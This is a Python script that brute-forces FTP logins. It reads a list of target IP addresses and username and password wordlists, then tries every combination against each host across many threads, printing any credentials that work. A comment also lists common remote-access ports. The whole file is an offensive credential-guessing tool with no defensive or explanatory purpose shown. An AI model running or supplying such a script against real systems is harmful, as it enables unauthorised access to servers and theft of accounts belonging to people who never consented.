# ports: 80, 443, 8080, 21, 22, 23, 445, 3389, 5900
from ftplib import FTP
import concurrent.futures
import sys

stripped_chars_list = []
with open('IPs.txt', 'r') as file:
    for line in file:
        if line != '':
            # Get the first 10 characters of the line
            first_10_chars = line[:10]

            # Strip whitespaces from the first 10 characters
            stripped_chars = first_10_chars.strip()
            stripped_chars_list.append(stripped_chars)
passwords = []
with open('passwords.txt', 'r') as file:
    for line in file:
        passwords.append(line.strip())

usernames = []
with open('usernames.txt', 'r') as file:
    for line in file:
        usernames.append(line.strip())

def scan(n, stripped_chars_list, passwords, usernames):
    counter = 0
    server = 0
    nth_part = passwords[1000 * (n - 1):1000 * n]
    for ip in stripped_chars_list:
        server += 1
        for username in usernames:
            for password in nth_part:
                try:
                    ftp = FTP(host=ip, user=username, passwd=password)
                    ftp.login()
                    print("SUCCESS!!!")
                    print(ip, username, password)
                except:
                    print(str(counter) + " " + str(server) + " Thread: " + str(n))
                else:
                    sys.exit()
                counter += 1


with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:  # Threading module
    for i in range(1, 11):
        executor.submit(scan, i, stripped_chars_list, passwords, usernames)
